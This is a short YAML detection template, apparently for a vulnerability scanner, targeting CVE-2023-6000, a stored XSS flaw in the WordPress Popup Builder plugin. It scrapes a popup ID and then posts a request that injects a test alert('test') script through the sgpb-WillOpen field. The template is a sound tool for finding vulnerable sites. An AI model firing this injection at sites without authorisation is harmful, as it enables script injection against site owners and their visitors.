id: CVE-2023-6000

info:
  name: WordPress Popup Builder - Stored XSS Test
  author: riteshs4hu
  severity: medium
  description: |
    Stored XSS vulnerability in the WordPress Popup Builder plugin (< 4.2.3).

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    extractors:
      - type: regex
        name: popup_id
        regex:
          - 'sgpb-main-popup-data-container-([0-9]+)'
        group: 1
        internal: true

  - method: POST
    path:
      - "{{BaseURL}}/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      sgpb-is-preview=1&post_ID={{popup_id}}&sgpb-type=html&sgpb-WillOpen=alert('test');

    matchers:
      - type: word
        words:
          - "alert('test')"
